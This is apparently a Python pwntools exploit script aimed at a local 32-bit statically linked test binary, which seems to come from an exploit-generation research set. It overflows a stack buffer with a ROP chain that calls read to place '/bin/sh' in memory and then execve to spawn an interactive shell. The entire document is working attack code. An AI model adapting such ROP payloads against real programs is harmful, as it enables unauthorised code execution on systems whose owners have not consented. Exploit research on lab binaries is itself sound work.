from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/32bit/stack_overflow/static/test4/static_test4")
pwn.gdb.attach(p)
payload = b"\x00" * 28
payload += p32(0x806df92) + p32(0x80db2c0) + p32(0x0) + p32(0x80a8c26) + p32(0x3) + p32(0x806df6c) + p32(0x8) + p32(0x806e8b0) + p32(0x806df92) + p32(0x0) + p32(0x80db2c0) + p32(0x80a8c26) + p32(0xb) + p32(0x806df6c) + p32(0x0) + p32(0x806e8b0)
payload = payload.ljust(256, b"a")
p.send(payload)
payload = b""
payload += b'/bin/sh\x00'
p.send(payload)
p.interactive()
